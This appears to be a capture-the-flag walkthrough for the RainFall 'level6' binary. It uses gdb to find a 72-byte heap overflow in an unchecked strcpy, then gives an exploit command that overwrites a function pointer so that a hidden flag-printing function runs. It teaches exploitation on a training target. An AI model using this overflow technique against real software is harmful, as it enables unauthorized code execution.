The program expects a command line input that will be use in a `strcpy` just before the double pointer on the `m()` function is executed. We can see an hidden function `n()` which prints the flag we need. Here the function `strcpy` will copy the bytes of the source `argv[1]` to dest `uVar1` until meet a `\0`, but without check on the size. We will have to trace the value of the parameter we pass to level6 to exploit the buffer of `strcpy`, in order to change the execution of `m`.

1. Find out the buffer’s size
```
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
```
%eax should contain our argv[1]’s address. Check that out by inserting breakpoints after the first malloc call, and at the strcpy call and we can see that $eax value is the same. Then set a breakpoint at the address of m, and check the values where our `argv[1]` is stocked `0x804a008` :

```
(gdb) x /128bx 0x804a008
0x804a008:	0x41	0x41	0x41	0x41	0x41	0x41	0x00	0x00
0x804a010:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a018:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a030:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a040:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a048:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a050:	0x68	0x84	0x04	0x08	0x00	0x00	0x00	0x00
```
We can see that at 0x804a050 there is the address of `m()` so end of our buffer is at 0x804a048.
```
>>> int(hex(0x804a050 - 0x804a008), 16)
72
```
The buffer size is 72.


2. Find out the variable’s address.
```
(gdb) x n
0x8048454 <n>:	0x55
```

3. Exploit !
In the terminal :
```
level6@RainFall:~$ ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
```
